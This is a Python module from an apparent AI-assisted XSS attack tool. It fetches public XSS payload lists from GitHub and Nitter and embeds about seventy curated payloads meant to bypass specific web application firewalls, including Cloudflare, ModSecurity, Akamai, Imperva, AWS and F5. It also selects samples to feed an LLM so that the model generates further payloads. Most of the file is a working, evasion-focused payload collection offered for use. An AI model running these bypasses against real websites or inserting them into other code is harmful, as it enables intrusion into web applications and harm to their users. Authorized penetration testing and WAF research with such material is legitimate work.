from __future__ import annotations

"""
Public XSS payload fetcher.

Sources
-------
- payloadbox/xss-payload-list  (generic, ~650 raw payloads)
- s0md3v/AwesomeXSS            (community aggregation, social-media origin)
- Pgaijin66/XSS-Payloads       (community collection)
- Nitter search                 (best-effort; skipped silently if all instances down)
- Embedded WAF-specific bypass lists (cloudflare, modsecurity, akamai, imperva,
                                      aws, f5, fastly, sucuri, barracuda, wordfence)

All fetched payloads are cached in ~/.cache/axss/ with a 24-hour TTL.
Social sources use a 6-hour TTL.
"""

import re
from typing import Any

import requests

from ai_xss_generator.cache import cache_get, cache_set, _SOCIAL_TTL, _DEFAULT_TTL
from ai_xss_generator.types import PayloadCandidate


# ---------------------------------------------------------------------------
# Remote source definitions
# ---------------------------------------------------------------------------

_GENERIC_SOURCES: list[dict[str, Any]] = [
    {
        "key": "public_payloadbox",
        "url": "https://raw.githubusercontent.com/payloadbox/xss-payload-list/master/Intruder/xss-payload-list.txt",
        "format": "lines",
        "source": "public",
        "tags": ["public", "generic"],
        "ttl": _DEFAULT_TTL,
    },
]

_SOCIAL_SOURCES: list[dict[str, Any]] = [
    {
        "key": "social_awesomexss",
        "url": "https://raw.githubusercontent.com/s0md3v/AwesomeXSS/master/Database/regular-payloads.txt",
        "format": "lines",
        "source": "social",
        "tags": ["social", "community"],
        "ttl": _SOCIAL_TTL,
    },
    {
        "key": "social_pgaijin66",
        "url": "https://raw.githubusercontent.com/Pgaijin66/XSS-Payloads/master/payload/payload.txt",
        "format": "lines",
        "source": "social",
        "tags": ["social", "community"],
        "ttl": _SOCIAL_TTL,
    },
]

_NITTER_INSTANCES: list[str] = [
    "https://nitter.privacydev.net",
    "https://nitter.poast.org",
    "https://nitter.1d4.us",
    "https://nitter.kavin.rocks",
]

# Looks like a payload: contains angle brackets, javascript:, onerror=, or onload=
_PAYLOAD_RE = re.compile(
    r'(<[a-zA-Z][^>]*(?:on\w+\s*=|src\s*=|href\s*=|srcdoc)[^>]*>|javascript:|alert\s*\(|onerror\s*=|onload\s*=)',
    re.IGNORECASE,
)


# ---------------------------------------------------------------------------
# Embedded WAF-specific bypass payloads
# (Curated; not fetched at runtime so always available offline)
# ---------------------------------------------------------------------------

_WAF_PAYLOADS: dict[str, list[dict[str, str]]] = {
    "cloudflare": [
        {"payload": "<svg/onload=\u0061lert(1)>", "title": "CF: SVG unicode alert"},
        {"payload": "<img src=x onerror=\u0061lert(1)>", "title": "CF: img unicode alert"},
        {"payload": "<input autofocus onfocus=alert(1)>", "title": "CF: autofocus onfocus"},
        {"payload": "<details open ontoggle=alert(1)>", "title": "CF: details ontoggle"},
        {"payload": "<video src onerror=alert(1)>", "title": "CF: video onerror"},
        {"payload": "<body onpageshow=alert(1)>", "title": "CF: body onpageshow"},
        {"payload": "<marquee onstart=alert(1)>", "title": "CF: marquee onstart"},
        {
            "payload": "<a href=\"j&#9;a&#9;v&#9;a&#9;s&#9;c&#9;r&#9;i&#9;p&#9;t:alert(1)\">x</a>",
            "title": "CF: tab-split javascript URI",
        },
        {"payload": "<svg><animate onbegin=alert(1) attributeName=x>", "title": "CF: SVG animate onbegin"},
        {"payload": "\\u003cimg src=x onerror=alert(1)\\u003e", "title": "CF: unicode-escaped img"},
        {"payload": "<script>\\u0061lert(1)</script>", "title": "CF: script unicode alert"},
        {
            "payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//",
            "title": "CF: mixed-case js URI polyglot",
        },
    ],
    "modsecurity": [
        {"payload": "<img src=\"x:gif\" style=\"width:200px\" onerror=\"alert(1)\">", "title": "ModSec: typed src img"},
        {"payload": "<form><button formaction=javascript:alert(1)>X", "title": "ModSec: formaction"},
        {"payload": "<isindex action=j&#x61vascript:alert(1) type=image>", "title": "ModSec: isindex action"},
        {"payload": "<body onhashchange=alert(1)><a href=#>click", "title": "ModSec: hashchange"},
        {"payload": "<input type=image src onerror=\"alert(1)\">", "title": "ModSec: image input onerror"},
        {
            "payload": "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x\">",
            "title": "ModSec: SVG use data-URI",
        },
        {"payload": "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">", "title": "ModSec: base64 object"},
        {"payload": "<iframe srcdoc=\"&#60;script&#62;alert(1)&#60;/script&#62;\">", "title": "ModSec: srcdoc entity encoded"},
        {"payload": "<script>alert`1`</script>", "title": "ModSec: template literal alert"},
        {"payload": "<a href=\" &#14;  javascript:alert(1)\">x</a>", "title": "ModSec: whitespace before protocol"},
    ],
    "akamai": [
        {"payload": "<SCRIPT>alert('XSS')</SCRIPT>", "title": "Akamai: uppercase script"},
        {
            "payload": "<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
            "title": "Akamai: decimal entity URI",
        },
        {"payload": "<IMG SRC=\"jav&#x0A;ascript:alert(1);\">", "title": "Akamai: newline-split protocol"},
        {"payload": "<IMG SRC=\"jav\tascript:alert(1);\">", "title": "Akamai: tab-split protocol"},
        {"payload": "<<SCRIPT>alert(1)//<</SCRIPT>", "title": "Akamai: double-open script"},
        {"payload": "<BODY ONLOAD=alert(1)>", "title": "Akamai: body onload uppercase"},
        {"payload": "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"/>", "title": "Akamai: SVG xmlns onload"},
        {"payload": "%3Cscript%3Ealert(1)%3C%2Fscript%3E", "title": "Akamai: URL-encoded script"},
        {"payload": "<IMG \"\"\"><SCRIPT>alert(1)</SCRIPT>\">", "title": "Akamai: malformed img > script"},
    ],
    "imperva": [
        {"payload": "<div style=\"background:url(javascript:alert(1))\">", "title": "Imperva: CSS url()"},
        {"payload": "<link rel=stylesheet href=javascript:alert(1)>", "title": "Imperva: link stylesheet"},
        {"payload": "``onmouseover=alert(1)", "title": "Imperva: backtick attribute"},
        {"payload": "<style>@import'javascript:alert(1)'</style>", "title": "Imperva: @import js"},
        {"payload": "<img src='x' onerror='&#97;lert(1)'>", "title": "Imperva: entity in handler"},
        {"payload": "<object type=\"text/x-scriptlet\" data=\"javascript:alert(1)\">", "title": "Imperva: scriptlet object"},
        {"payload": "<svg><script>alert&#40;1&#41;</script>", "title": "Imperva: SVG script entity parens"},
        {"payload": "<x contenteditable onblur=alert(1)>lose focus", "title": "Imperva: contenteditable onblur"},
    ],
    "aws": [
        {"payload": "<script>alert(String.fromCharCode(88,83,83))</script>", "title": "AWS: fromCharCode"},
        {"payload": "<img src=x onerror=\"&#97;&#108;&#101;&#114;&#116;(1)\">", "title": "AWS: entity handler"},
        {"payload": "<BODY ONLOAD=alert('XSS')>", "title": "AWS: BODY ONLOAD"},
        {"payload": "<<SCRIPT>alert(\"XSS\");//<</SCRIPT>", "title": "AWS: double-open script"},
        {"payload": "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>", "title": "AWS: img fromCharCode"},
        {"payload": "<s\x00cript>alert(1)</s\x00cript>", "title": "AWS: null byte script"},
        {"payload": "<scr\x00ipt>alert(1)</scr\x00ipt>", "title": "AWS: null byte split scr-ipt"},
        {"payload": "<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>", "title": "AWS: SVG entity alert"},
    ],
    "f5": [
        {"payload": "<s c r i p t>alert(1)</s c r i p t>", "title": "F5: space-split script tag"},
        {"payload": "<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>", "title": "F5: img fromCharCode"},
        {"payload": "<IMG \"\"\"SCRIPT>alert(\"XSS\")</SCRIPT>\">", "title": "F5: malformed img script"},
        {"payload": "<img src=x:alert(1) onerror=eval(src)>", "title": "F5: eval(src) chain"},
        {"payload": "<svg><script>alert(1)</script></svg>", "title": "F5: SVG script block"},
        {"payload": "<form><input type=submit formaction=javascript:alert(1) value=go>", "title": "F5: formaction submit"},
        {"payload": "<button onclick=alert(1)>x</button>", "title": "F5: button onclick"},
    ],
    "fastly": [
        {"payload": "<svg onload=alert(1)>", "title": "Fastly: SVG onload"},
        {"payload": "<img/src/onerror=alert(1)>", "title": "Fastly: slash-separated img"},
        {"payload": "<details/open/ontoggle=\"alert(1)\">", "title": "Fastly: details slash syntax"},
        {"payload": "<video><source onerror=alert(1)>", "title": "Fastly: video source onerror"},
        {"payload": "<audio src=x onerror=alert(1)>", "title": "Fastly: audio onerror"},
        {"payload": "<iframe src=\"javascript:alert(1)\">", "title": "Fastly: iframe js src"},
    ],
    "sucuri": [
        {"payload": "<svg/onload=alert(1)>", "title": "Sucuri: SVG onload"},
        {"payload": "<img src=x onerror=alert(1)>", "title": "Sucuri: img onerror"},
        {"payload": "'\"><svg onload=alert(1)>", "title": "Sucuri: polyglot breakout"},
        {"payload": "<input onfocus=alert(1) autofocus>", "title": "Sucuri: autofocus"},
        {"payload": "<body/onload=alert(1)>", "title": "Sucuri: body slash onload"},
        {"payload": "<script>window['al'+'ert'](1)</script>", "title": "Sucuri: concat window alert"},
    ],
    "barracuda": [
        {"payload": "<img src=\"jav\nascript:alert(1)\">", "title": "Barracuda: newline JS URI"},
        {"payload": "<script>alert(1)</script>", "title": "Barracuda: plain script"},
        {"payload": "<iframe src=javascript:alert(1)>", "title": "Barracuda: iframe js src"},
        {"payload": "<object data=javascript:alert(1)>", "title": "Barracuda: object js data"},
        {"payload": "<embed src=javascript:alert(1)>", "title": "Barracuda: embed js src"},
    ],
    "wordfence": [
        {"payload": "<svg/onload=alert(1)>", "title": "Wordfence: SVG onload"},
        {"payload": "<img src onerror=alert(1)>", "title": "Wordfence: img onerror no src"},
        {"payload": "';alert(1)//", "title": "Wordfence: JS quote breakout"},
        {"payload": "<details open ontoggle=alert(1)>x</details>", "title": "Wordfence: details ontoggle"},
        {"payload": "<script>eval(atob('YWxlcnQoMSk='))</script>", "title": "Wordfence: eval atob"},
        {"payload": "<input type=hidden onfocus=alert(1) autofocus>", "title": "Wordfence: hidden autofocus"},
    ],
    "azure": [
        {"payload": "<svg onload=alert(1)>", "title": "Azure: SVG onload"},
        {"payload": "<img src=x onerror=alert(1)>", "title": "Azure: img onerror"},
        {"payload": "<script>alert(document.domain)</script>", "title": "Azure: script domain"},
        {"payload": "<a href=javascript:alert(1)>x</a>", "title": "Azure: anchor js href"},
        {"payload": "<body onfocus=alert(1) autofocus>", "title": "Azure: body autofocus"},
    ],
}


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------

def _raw_lines_to_candidates(
    lines: list[str],
    source: str,
    tags: list[str],
    waf: str | None = None,
) -> list[PayloadCandidate]:
    candidates: list[PayloadCandidate] = []
    waf_tag = [f"waf:{waf}"] if waf else []
    for line in lines:
        payload = line.strip()
        if not payload or payload.startswith("#"):
            continue
        candidates.append(
            PayloadCandidate(
                payload=payload,
                title=f"{source}: {payload[:40]}",
                explanation=f"Known payload from {source} source.",
                test_vector="Inject into reflected parameter or DOM sink.",
                tags=tags + waf_tag,
                source=source,
            )
        )
    return candidates


def _fetch_lines(url: str, timeout: int = 15) -> list[str]:
    resp = requests.get(
        url,
        timeout=timeout,
        headers={"User-Agent": "axss/public-payload-fetcher (+authorized security testing)"},
    )
    resp.raise_for_status()
    return resp.text.splitlines()


def _fetch_source(spec: dict) -> list[PayloadCandidate]:
    """Fetch one remote source, using cache if fresh."""
    cached = cache_get(spec["key"], ttl=spec["ttl"])
    if cached is not None:
        return [PayloadCandidate(**item) for item in cached]

    lines = _fetch_lines(spec["url"])
    candidates = _raw_lines_to_candidates(lines, source=spec["source"], tags=spec["tags"])
    cache_set(spec["key"], [c.to_dict() for c in candidates])
    return candidates


def _fetch_nitter(timeout: int = 8) -> list[PayloadCandidate]:
    """Best-effort: scrape Nitter instances for XSS payload posts."""
    cache_key = "social_nitter"
    cached = cache_get(cache_key, ttl=_SOCIAL_TTL)
    if cached is not None:
        return [PayloadCandidate(**item) for item in cached]

    for instance in _NITTER_INSTANCES:
        try:
            url = f"{instance}/search?q=xss+payload+bypass&f=tweets"
            resp = requests.get(
                url,
                timeout=timeout,
                headers={"User-Agent": "Mozilla/5.0 (compatible; axss-research)"},
            )
            if resp.status_code != 200:
                continue

            # Extract tweet text from Nitter HTML (tweet-content class)
            tweet_texts = re.findall(
                r'class="tweet-content[^"]*"[^>]*>(.*?)</div>',
                resp.text,
                re.DOTALL,
            )
            candidates: list[PayloadCandidate] = []
            for raw in tweet_texts:
                # Strip HTML tags from tweet text
                text = re.sub(r"<[^>]+>", "", raw).strip()
                if len(text) < 5 or len(text) > 300:
                    continue
                if not _PAYLOAD_RE.search(text):
                    continue
                candidates.append(
                    PayloadCandidate(
                        payload=text,
                        title=f"Social: {text[:40]}",
                        explanation="Payload sourced from security researcher social media post.",
                        test_vector="Inject into reflected parameter or DOM sink.",
                        tags=["social", "twitter", "community"],
                        source="social",
                    )
                )

            if candidates:
                cache_set(cache_key, [c.to_dict() for c in candidates])
                return candidates

        except Exception:
            continue  # try next instance

    return []  # all instances failed — silently skip


def _waf_candidates(waf: str) -> list[PayloadCandidate]:
    """Return embedded bypass payloads for the given WAF (no network call)."""
    entries = _WAF_PAYLOADS.get(waf.lower(), [])
    return [
        PayloadCandidate(
            payload=entry["payload"],
            title=entry["title"],
            explanation=f"Known bypass technique for {waf.title()} WAF.",
            test_vector=f"Test against targets protected by {waf.title()}.",
            tags=["waf-bypass", f"waf:{waf}", "public"],
            source="public",
        )
        for entry in entries
    ]


# ---------------------------------------------------------------------------
# Public API
# ---------------------------------------------------------------------------

class FetchResult:
    """Container returned by fetch_public_payloads with per-source counts."""

    def __init__(self) -> None:
        self.payloads: list[PayloadCandidate] = []
        self.counts: dict[str, int] = {}
        self.cached_keys: list[str] = []
        self.errors: list[str] = []

    def add(self, key: str, candidates: list[PayloadCandidate], *, from_cache: bool = False) -> None:
        self.payloads.extend(candidates)
        self.counts[key] = len(candidates)
        if from_cache:
            self.cached_keys.append(key)

    def total(self) -> int:
        return len(self.payloads)


def fetch_public_payloads(
    waf: str | None = None,
    include_social: bool = True,
    progress: Any = None,
) -> FetchResult:
    """
    Fetch public XSS payloads from all configured sources.

    Parameters
    ----------
    waf:            If given, also include embedded bypass payloads for that WAF.
    include_social: Whether to fetch social/community sources (+ Nitter).
    progress:       Optional callable(str) for verbose logging.

    Returns
    -------
    FetchResult with .payloads (list[PayloadCandidate]) and per-source metadata.
    """
    from ai_xss_generator.cache import cache_get as _cg  # local import to avoid circular

    result = FetchResult()

    # Generic sources
    for spec in _GENERIC_SOURCES:
        is_cached = _cg(spec["key"], ttl=spec["ttl"]) is not None
        label = f"{spec['key']} [cached]" if is_cached else spec["key"]
        if progress:
            progress(f"  Fetching {label}...")
        try:
            candidates = _fetch_source(spec)
            result.add(spec["key"], candidates, from_cache=is_cached)
        except Exception as exc:
            result.errors.append(f"{spec['key']}: {exc}")
            if progress:
                progress(f"  Warning: {spec['key']} failed: {exc}")

    # Social / community sources
    if include_social:
        for spec in _SOCIAL_SOURCES:
            is_cached = _cg(spec["key"], ttl=spec["ttl"]) is not None
            label = f"{spec['key']} [cached]" if is_cached else spec["key"]
            if progress:
                progress(f"  Fetching {label}...")
            try:
                candidates = _fetch_source(spec)
                result.add(spec["key"], candidates, from_cache=is_cached)
            except Exception as exc:
                result.errors.append(f"{spec['key']}: {exc}")

        # Nitter best-effort
        if progress:
            progress("  Trying Nitter social search (best-effort)...")
        nitter_candidates = _fetch_nitter()
        if nitter_candidates:
            result.add("social_nitter", nitter_candidates)
        elif progress:
            progress("  Nitter unavailable — skipping.")

    # WAF-specific embedded payloads
    if waf:
        waf_lower = waf.lower()
        if progress:
            progress(f"  Loading {waf_lower} WAF bypass payloads...")
        waf_candidates = _waf_candidates(waf_lower)
        result.add(f"waf_{waf_lower}", waf_candidates)

    return result


def select_reference_payloads(
    payloads: list[PayloadCandidate],
    limit: int = 20,
) -> list[PayloadCandidate]:
    """
    Pick a diverse, technique-representative sample from the full public list
    to inject into the LLM prompt as reference examples.

    Prioritises tag diversity so Qwen sees a range of techniques.
    """
    tag_seen: set[str] = set()
    selected: list[PayloadCandidate] = []
    remaining: list[PayloadCandidate] = []

    for payload in payloads:
        new_tags = set(payload.tags) - tag_seen
        if new_tags:
            selected.append(payload)
            tag_seen |= new_tags
        else:
            remaining.append(payload)
        if len(selected) >= limit:
            break

    # Fill up to limit with whatever is left
    for payload in remaining:
        if len(selected) >= limit:
            break
        selected.append(payload)

    return selected[:limit]
